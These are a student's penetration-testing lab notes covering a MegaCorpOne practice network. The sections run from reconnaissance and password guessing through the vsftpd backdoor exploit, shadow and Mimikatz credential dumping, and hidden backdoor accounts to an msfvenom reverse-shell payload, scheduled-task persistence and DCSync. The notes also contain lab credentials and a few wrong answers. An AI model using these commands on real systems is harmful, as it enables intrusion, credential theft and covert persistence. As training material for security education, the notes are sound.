### Day 1
#### Activity 1
1. A business hires you to perform a penetration test. They said they will provide credentials for you as long as you do not share them with anyone outside of the business. Before starting the assessment, they’ve made you sign a non-disclosure agreement (NDA) and covered the rules of engagement (ROE).
	Grey Box  // Legal
2. A friend verbally asks you to hack his home network and gives you his public router’s IP address.
	Black Box // Illegal
3. You are on a random shopping website and discover a potential vulnerability. Using your recent knowledge from class, you attempt to validate whether the website is vulnerable to an attack
	Black Box // Illegal
4. A local government hires you to perform a penetration test on their internal network, giving you full access to all their network diagrams and their device IP list and supplying you with administrative credentials. There is a contract in place to perform the assessment that is signed by all appropriate parties.
	White Box // Legal 
5.  After negotiating a contract and signing all legal forms, an enterprise business hires you to perform a penetration test. They supply you with a domain name that is in scope and a two-month assessment time.
    Black Box // Legal
6.  A family member asks you to assess their security on their home network. You bring your laptop, connect to their WiFi, and begin the assessment with port scans.
    Black Box // Illegal
7.  A business hires you to perform an assessment and sends over a contract that states all company-owned hardware is within scope and provides you a list of assets. When searching the public IP addresses of the assets from the provided lists, you determine they are hosted within Microsoft’s cloud platform, Azure.
    Grey Box // Illegal
8.  A medium-sized business hires you to perform a penetration test and supplies you with credentials and scope. The contract is almost finalized, but the manager of the company is insistent that you start the assessment now to avoid lapsing into their next fiscal year.
    Grey Box // Illegal
---


#### Activity 2
1.  In a browser, navigate to Google.
2.  Using the `site` Google operand, identify the web service name and version. MegaCorpOne's website is megacorpone.com.
	Apache/2.4.38
3.  Using the `intext` and `site` operands, create a list of user names and their email addresses. 
	Joe Sheer // joe@megacorpone.com
	Mike Carlow // mcarlow@megacorpone.com
	Alan Grofield // agrofield@megacorpone.com
	**Naming Scheme** 
By searching for specific file types using the `ext` operand, find a hidden file.
	robots.txt
site:megacorpone.com intext:@megacorpone.com // ext:txt
#### Activity 3
1.  Navigate to [https://account.shodan.io/register](https://account.shodan.io/register), and create a free account on Shodan.io.
2.  After registering, log in and navigate to [https://shodan.io](https://shodan.io).
3.  In a terminal session, perform an nslookup on [www.megacorpone.com](http://www.megacorpone.com)
    nslookup www.megacorpone.com
4.  In Shodan, search the IP address that was returned from the nslookup query.
    149.56.244.87
5.  Answer the following questions:
    -   What ports are open?
        22, 80, 443
    -   What version of SSH is the server running?
        2.0-OpenSSH_7.9p1
    -   What OS is the server?
        Apache 
    -   What is the version of the web server running?
        2.4.38
    -   Which vulnerabilities may be present on the server? (CVE numbers are fine.)
        [CVE-2019-0196](https://www.shodan.io/search?query=vuln%3ACVE-2019-0196)
        [CVE-2020-1934](https://www.shodan.io/search?query=vuln%3ACVE-2020-1934)
        [CVE-2021-34798](https://www.shodan.io/search?query=vuln%3ACVE-2021-34798)
        [CVE-2020-35452](https://www.shodan.io/search?query=vuln%3ACVE-2020-35452)
        https://www.shodan.io/host/149.56.244.87
    -   Where is this server located?
	    montreal canada

#### Activity 4
![[Pasted image 20221110210154.png]]
![[Pasted image 20221110211109.png]]

### Day 2
#### Activity 1
In a web browser, navigate to [https://phishingquiz.withgoogle.com/](https://phishingquiz.withgoogle.com/), and take the interactive test

#### Activity 2
1.  On your Kali machine, open the web browser, navigate to vpn.megacorpone.com, where you will be prompted to log in.
2.  Using the list of usernames that you obtained during Day 1 without the email extension (e.g., bsmith instead of [bsmith@megacorpone.com](mailto:bsmith@megacorpone.com)), attempt to log in to the website by guessing basic passwords.
	thudson
	thudson
    -   **Hint**: Try variants of "Password," "SeasonYear" (e.g., Summer2021), or even the user's own username.
    -   You only need to successfully guess **ONE** set of credentials to continue; the rest are bonus.
3.  Once logged in, download the shell script in Kali and place it in your `Downloads` folder (if it doesn't automatically download to it).
    cd ~/Downloads
4.  Change the permissions on the shell script to make it executable, then run the shell script and log in with the same credentials that you just used.
    chmod +x vpn.sh
    ./vpn.sh
     ![[Pasted image 20221114191209.png]]
BONUS
-   Try guessing other users' passwords.
    -   **Hint**: There is a total of 5 username/password combinations that you can use to log in.

#### Activity 3
1.  In Kali, launch Zenmap by typing `zenmap` in the terminal.
4.  Type in your subnet's IP range using CIDR notation (e.g., /24), and click "Scan." Wait for the scan to finish, and view the results. There is a machine of interest that has port 21 open; take note of its IP address.
	172.22.117.0/24
1. ![[Pasted image 20221114194821.png]]
Vulnerable FTP port service
![[Pasted image 20221114195020.png]]
open ports

#### Activity 4
1.  Refer to your past Nmap or Zenmap scans, and look in the scan results for Metasploitable2.
    -   If you cannot find it by hostname, it will be the machine with the most ports open.
2.  Several of these services are exploitable; however, one is exploitable with a Python script. Using `searchsploit` in Kali, search for any exploits around the service that is **listening on port 21**. You're searching for an exploit that allows you to execute a backdoor and is written in Python.
    -   It's important to examine scripts before running them. Some scripts require variables to be edited within the script, whereas others can have variables passed through the command line.
3.  Edit the script in nano. The path that is listed on the right is relative to the `/usr/share/exploitdb/exploit` directory, e.g., `/usr/share/exploitdb/exploit/unix/remote/xxxxx.py`.
    ==searchsploit -m unix/remote/49757.py
4.  We can tell from the two variables `args` and `host` that this script accepts the IP address of the vulnerable host as an argument, so there is no need to edit the script. Close the script using ctrl+X.
    ==nano 49757.py
5.  Run the script without any arguments to see the output of the script.
    ==python3 49757.py==
6.  Now, pass in the host IP address as an argument, and run the script again. You should see a message saying "Success, shell opened." Type in a Linux command to check if the shell works.
![[Pasted image 20221114210304.png]]

### Day 3
#### Activity 1
1.  What is the name of the C2 framework?
	Cobalt Strike
2.  What operating systems do its agents support?
	Windows
3.  What channels can the agents communicate over?
	HTTP/S, DNS, TCP, SMB
4.  What language is it written in?
	Java
5.  Is it open or closed source?
	Closed
6.  Does the developer have a Slack or Twitter link for potential support questions?
	No

#### Activity 2
-   **Exploit**: vsftpd_234_backdoor
-   **Host IP address**: 172.22.117.150
-   **Port**: 21
-   **Service name**: vsftpd
-   **Service version**: 2.3.4
-   **Exploit outcome**: Success second try
- ![[Pasted image 20221116170636.png]]
- ![[Pasted image 20221116170723.png]]
-   **Exploit**: smtp_enum
-   **Host IP address**: 172.22.117.150
-   **Port**: 25
-   **Service name**: smtp
-   **Service version**: N/A
-   **Exploit outcome**: Success![[Pasted image 20221116172529.png]]

![[Pasted image 20221116175255.png]]
#### Activity 3
find / -type f -iname "*key*.rsa"
	lots of permission denied for keys
find / -type f -iname "*admin*.txt"
	shows us /var/tmp/adminpassword.txt
![[Pasted image 20221116180801.png]]
admin credentials now we can try to SSH into the admin user
![[Pasted image 20221116180948.png]]
Bonus: try to get root user
![[Pasted image 20221116181025.png]]
though process is if admin has sudo priveleges we can force switch user to the root user.
### Day 4
#### Activity 1
1.  SSH into the target machine using the credentials that you found during the privilege-escalation activity.
    ssh 172.22.117.150@msfadmin
    pass: cybersecurity
2.  Gather a list of active users and their password hashes from the shadow file and save it as a `.txt` file.
    megacorpusers.txt
    -   Note that stealing the entire shadow file may be a waste of time, because Linux machines have service accounts that are disabled and will serve no use. Your goal in gathering password hashes is to eventually crack the hashes for the **users**, some of whom may have accounts with the same password on other machines on the network.
3.  Format your hashes as such: `username:passwordhash` (e.g., `bob:$1$HESu9xrH$k.o4G93DGoXaiQKkPmUgZ0`).

    **Note**: The hash will start with `$1$` and end before the colon (`:`).
    
4.  Crack the hashes by using `john` and passing in the text file with the hashes as an argument (e.g., `john hashes.txt`).
    ![[Pasted image 20221117190628.png]]

    **Note**: By default, `john` uses a default wordlist. Some passwords may need an additional wordlist. In Kali, wordlists are located in the `/usr/share/wordlists` directory. Try different wordlists until you crack the password for the 'tstark' user.
    ![[Pasted image 20221117191814.png]]

#### Activity 2
1.  On the target host, read the top 10 lines of the SSH config file, located at `/etc/ssh/sshd_config`, and identify the line where a port is specified.
    line 5
2.  Using Nano, edit the file to add an additional port, 10022. (You must `sudo` to do this.)
    sudo nano /etc/ssh/sshd_config
    -   Due to this machine having limited services, you must restart the machine in order to restart the SSH service. Restart the machine via `sudo reboot`.
3.  Now, create a new backdoor account. In order to remain inconspicuous, name this account so that it appears as if it's a service. Create a new account named "systemd-ssh", with the password "password", and then add it to the sudoers group.
    sudo nano /etc/sudoers
4.  Confirm that the new account works by SSHing from your machine to the target host over port 10022 as the new user you created.
    
    -   Use the following command to ssh with a different port: `ssh -p 10022 systemd-ssh@ipaddress`
    - ![[Pasted image 20221117192938.png]]

---
### Day 5
#### Activity 1
1.  Perform `ip addr` to identify your IP address, and perform an Nmap scan on that subnet (/24) to identify all machines on that network.
    `ip addr`
2.  Based on the result of your scan, answer the following questions:
    `nmap -sV 172.22.117.0/24`
    1.  How many Windows machines are on the network?
	    One
    2.  What ports/services are open on the machines that suggest that they're Windows machines?
	     Ports 88, 135, 445, and no port 22
    3.  Can you tell which machine is the domain controller?
	    yes, its running kerberos

#### Activity 2
1.  Set the SMBUser and SMBPass to a set of credentials you cracked from the /etc/shadow file.
    megauser.txt & megapass.txt
    ![[Pasted image 20221121192905.png]]
2.  Referencing your nmap/zenmap scans, set SMBDomain to the domain of the Windows10 machine. (If the domain is lab.local, for example, the domain would just be `lab`)
    N/A
3.  Set RHOSTS to the entire subnet in CIDR notation. (E.g., x.x.x.x/24)
	set RHOSTS 172.22.117.0/24
4. Run the attack. What machines was it able to successfully log in to?
    run
    ![[Pasted image 20221121194136.png]]
    Success!!
5.  Open the WINDC01 VM in Hyper-V and attempt to login with those credentials. Were you able to successfully login?
    no // unable to login to RDP without administrator permissions
6.  What was the domain for the account you just password sprayed?
	MEGACORPONE

#### Activity 3
Kali box
```bash
responder -I eth1 -v
```

Windows
login with bbanner:Winter2021
open command prompt: `net use z: \\bensshare.local\lol
![[Pasted image 20221121202422.png]]
john hash.txt returned us with bbanner's password.
#### Activity 4
1.  In Kali, open a terminal and start Metasploit (if not already started), then load the `scanner/smb/impacket/wmiexec` module.
    `msfconsole
    `search wmiexec
    `use 0
2.  View the options for the module, and set the RHOSTS, SMBDomain, SMBPass, and SMBUser fields to the target IP and credentials that you verified from password spraying
    `options
3.  Set the COMMAND parameter to "whoami".
    set COMMAND whoami
4.  Run the module. You should see the output "megacorpone\tstark".
    Success
    ![[Pasted image 20221121204051.png]]
    -   **Note**: If your command times out, try to ping the Windows10 machine from your Kali machine via command `ping 172.22.117.20`. If you do not get a ping back, have your instructor restart your host machine.
5.  Change the COMMAND parameter to list the processes.
    set COMMAND tasklist
    ![[Pasted image 20221121204226.png]]
    -   **Hint**: WMI uses MS-DOS commands, not PowerShell. If you're stuck, look up how to list processes in MS-DOS.
6.  Using other commands, answer the following questions:
    1.  What is the version and build number of Windows?
        Windows 10 Build 17763
        ![[Pasted image 20221121204946.png]]
    2.  What processor architecture is the machine?
        Intel64
        ![[Pasted image 20221121205415.png]]
    3.  Are there any logged in users?
        bbanner
        ![[Pasted image 20221121204854.png]]
    4.  What shares are available on the machine
	![[Pasted image 20221121204812.png]]

### Day 6
#### Activity 1
1. Make sure you're in your home directory and then generate a Windows Meterpreter payload using the following commands:
	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > shell.exe`
2. Next, use SMBClient in Kali to interact with the Windows machine's file system over SMB. To connect to the remote filesystem, type: `smbclient //172.22.117.20/C$ -U megacorpone/tstark`
    - This connects to the `C` drive on the remote machine as the user tstark. 
3. You will then be asked for a password. Input tstark's password: `Password!`
4. List the files in the current directory using the following command:
    - `ls`
5. Upload your payload via the following command:
    - `put shell.exe`
    - Now that the payload is on the remote system, we can execute it using the WMI module in Metasploit. Before doing that, though, we need to ensure that Metasploit is listening for our payload to execute.
6. In Metasploit, select the `exploit/multi/handler` module, and configure it to match the payload settings by using the following commands:
    - `use exploit/multi/handler`
    - `set payload windows/meterpreter/reverse_tcp`
    - `set LHOST [IP ADDRESS]`
    - `set LPORT 4444`
    - `exploit -j`
    - **Note**: The `-j` argument in `exploit -j` means to run in the background. This ensures that our listener is constantly listening and we can use Metasploit with it listening in the background.
7. Now, switch to the WMI module.
    - `use scanner/smb/impacket/wmiexec`
8. Fill in the SMBPass, SMBUser, SMBDomain, and RHOSTS parameters, if not done already.
	 set SMBUser tstark set SMBPass Password! set SMBDomain megacorpone set RHOSTS 172.22.117.20
1. For COMMAND, put in the path of the payload that you uploaded on the remote machine. If you did not change directories when uploading via SMBClient, then the payload will be located in `C:\`.
    - `set COMMAND C:\shell.exe`
2. Run the module with the command `run`. The message "Meterpreter session 1 opened" should appear, as the following image shows:
	`run`
    - **Note**: After the message appears, the exploit will seem to "hang." You can safely use Ctrl + C once to exit the prompt. Your session will still be opened.
3. To view active sessions, type `sessions` and select the session based on the ID via the following command:
     - `sessions -i [session ID]`
Congratulations! You successfully created, transferred, and executed a custom payload on a Windows machine.
#### Activity 2
1.  Background the Meterpreter session via the `background` command.
2.  Use the `windows/local/persistence_service` module in Metasploit.
3.  View the OPTIONS and set the SESSION to your current Meterpreter session number ID. If you're unsure of the session number, type `sessions`.
4.  Once the parameters are set, run the module.
5.  Once complete, view the user ID.
6.  Notice that the executable it uploads is a random file name. How could we make this more stealthy?
		setting the remote exe files name and path could allow us to better hide our persistence.
		

#### Activity 3
migrating to the svchost.exe process
```bash
migrate         #shows syntax
ps              #shows active processes
# we must migrate to a process that does not interfere with core windows process. svchost.exe is a common usable process
migrate 3612    #takes us to process 3612
```

#### Activity 4
1.  In your Meterpreter session, drop into a `shell` session.
    -   `shell`
2.  Create a scheduled task that will execute your payload every day at midnight.
    -   `schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"`
Test your scheduled task.
-   `schtasks /run /tn Backdoor`
How could you improve this technique to make it more stealthy?
-   Better task name
    
-   Execute a better-named payload
    
-   Schedule the task only to run on certain events, such as logon

### Day 7
#### Activity 1
MIMIKATZ DEMO
``` bash
msfconole
	> #get a shell
	> use exploit/windows/smb/psexec
	> set rhosts 172.22.117.20
	> set smbuser tstark
	> set smbpass Password!
	> set smbdomain megacorpone
	> set LHOST 172.22.117.100
	> run
	> #migrate to x64 arch SYSTEM user
	> getpid  #observepid
	> ps
	> 	#find SYSTEM svchost.exe pid
	> migrate <pid>
	> #credential dump
	> load kiwi
	> ?    #observe new kiwi commands
	> lsa_dump_sam   #observe NTLM hashes
	> creds_all

nano hashes.txt
	#paste username:ntlm hashes
	#bbanner and Administrator only

john --format=NT hashes.txt
john hashes.txt --show
```
![[Pasted image 20221128185337.png]]
_gained a meterpreter shell and migrated to a stable and system process_
![[Pasted image 20221128190225.png]]
![[Pasted image 20221128190242.png]]
using the kiwi module (mimikatz) we were able to extract the hash for pparker and luckily for us also pparker's plaintext password.

#### Activity 2
First, ensure you're working from a SYSTEM level shell on the Windows10 machine, then use the 'exploit/windows/local/wmi' module.
	`use exploit/windows/local/wmi`
Next, set the following parameters:
-   `set RHOSTS 172.22.117.10`
-   `set SESSION [ID of the active Meterpreter session running as SYSTEM]`
-   `set SMBDomain megacorpone`
-   `set SMBUser bbanner`
-   `set SMBPass Winter2021`
-   `set LHOST 172.22.117.100`
Run the exploit. It may give an error, but should return another Meterpreter session on the WINDC01 machine.
![[Pasted image 20221128193126.png]]

#### Activity 3
1.  In Meterpreter, enter a shell then view the users on the machine via the `net` command.
    
2.  Exit the command shell, then load `kiwi` and perform `dcsync_ntlm` in Meterpreter for each of the users. Run the command `dcsync_ntlm` to see the usage.
    
3.  Take each NTLM hash and place them in a text file. Using `john`, crack the hashes in the file.




[CVE-2019-0196](https://www.shodan.io/search?query=vuln%3ACVE-2019-0196)
[CVE-2020-1934](https://www.shodan.io/search?query=vuln%3ACVE-2020-1934)
[CVE-2021-34798](https://www.shodan.io/search?query=vuln%3ACVE-2021-34798)
[CVE-2020-35452](https://www.shodan.io/search?query=vuln%3ACVE-2020-35452)
[CVE-2022-29404](https://www.shodan.io/search?query=vuln%3ACVE-2022-29404)
[CVE-2022-22721](https://www.shodan.io/search?query=vuln%3ACVE-2022-22721)
[CVE-2019-0211](https://www.shodan.io/search?query=vuln%3ACVE-2019-0211)
[CVE-2022-28330](https://www.shodan.io/search?query=vuln%3ACVE-2022-28330)
[CVE-2020-11993](https://www.shodan.io/search?query=vuln%3ACVE-2020-11993)
[CVE-2019-10081](https://www.shodan.io/search?query=vuln%3ACVE-2019-10081)
[CVE-2019-0217](https://www.shodan.io/search?query=vuln%3ACVE-2019-0217)
[CVE-2019-0197](https://www.shodan.io/search?query=vuln%3ACVE-2019-0197)
[CVE-2019-0215](https://www.shodan.io/search?query=vuln%3ACVE-2019-0215)
[CVE-2021-33193](https://www.shodan.io/search?query=vuln%3ACVE-2021-33193)
[CVE-2022-22720](https://www.shodan.io/search?query=vuln%3ACVE-2022-22720)
[CVE-2019-10092](https://www.shodan.io/search?query=vuln%3ACVE-2019-10092)
[CVE-2019-17567](https://www.shodan.io/search?query=vuln%3ACVE-2019-17567)
[CVE-2019-10097](https://www.shodan.io/search?query=vuln%3ACVE-2019-10097)
[CVE-2022-31813](https://www.shodan.io/search?query=vuln%3ACVE-2022-31813)
[CVE-2019-10098](https://www.shodan.io/search?query=vuln%3ACVE-2019-10098)
[CVE-2021-40438](https://www.shodan.io/search?query=vuln%3ACVE-2021-40438)
[CVE-2021-36160](https://www.shodan.io/search?query=vuln%3ACVE-2021-36160)
[CVE-2022-23943](https://www.shodan.io/search?query=vuln%3ACVE-2022-23943)
[CVE-2020-1927](https://www.shodan.io/search?query=vuln%3ACVE-2020-1927)
[CVE-2019-0220](https://www.shodan.io/search?query=vuln%3ACVE-2019-0220)
[CVE-2020-9490](https://www.shodan.io/search?query=vuln%3ACVE-2020-9490)
[CVE-2020-11984](https://www.shodan.io/search?query=vuln%3ACVE-2020-11984)
[CVE-2021-44790](https://www.shodan.io/search?query=vuln%3ACVE-2021-44790)
[CVE-2021-26690](https://www.shodan.io/search?query=vuln%3ACVE-2021-26690)
[CVE-2021-26691](https://www.shodan.io/search?query=vuln%3ACVE-2021-26691)
[CVE-2022-26377](https://www.shodan.io/search?query=vuln%3ACVE-2022-26377)
[CVE-2022-28614](https://www.shodan.io/search?query=vuln%3ACVE-2022-28614)
[CVE-2020-13938](https://www.shodan.io/search?query=vuln%3ACVE-2020-13938)
[CVE-2019-10082](https://www.shodan.io/search?query=vuln%3ACVE-2019-10082)
[CVE-2021-44224](https://www.shodan.io/search?query=vuln%3ACVE-2021-44224)
[CVE-2022-22719](https://www.shodan.io/search?query=vuln%3ACVE-2022-22719)
[CVE-2022-28615](https://www.shodan.io/search?query=vuln%3ACVE-2022-28615)
[CVE-2022-30556](https://www.shodan.io/search?query=vuln%3ACVE-2022-30556)
[CVE-2021-39275](https://www.shodan.io/search?query=vuln%3ACVE-2021-39275



[CVE-2019-0196]
[CVE-2020-1934]
[CVE-2021-34798]
[CVE-2020-35452]
[CVE-2022-29404]
[CVE-2022-22721]
[CVE-2019-0211]
[CVE-2022-28330]
[CVE-2020-11993]
[CVE-2019-10081]
[CVE-2019-0217]
[CVE-2019-0197]
[CVE-2019-0215]
[CVE-2021-33193]
[CVE-2022-22720]
[CVE-2019-10092]
[CVE-2019-17567]
[CVE-2019-10097]
[CVE-2022-31813]
[CVE-2019-10098]
[CVE-2021-40438]
[CVE-2021-36160]
[CVE-2022-23943]
[CVE-2020-1927]
[CVE-2019-0220]
[CVE-2020-9490]
[CVE-2020-11984]
[CVE-2021-44790]
[CVE-2021-26690]
[CVE-2021-26691]
[CVE-2022-26377]
[CVE-2022-28614]
[CVE-2020-13938]
[CVE-2019-10082]
[CVE-2021-44224]
[CVE-2022-22719]
[CVE-2022-28615]
[CVE-2022-30556]
[CVE-2021-39275]
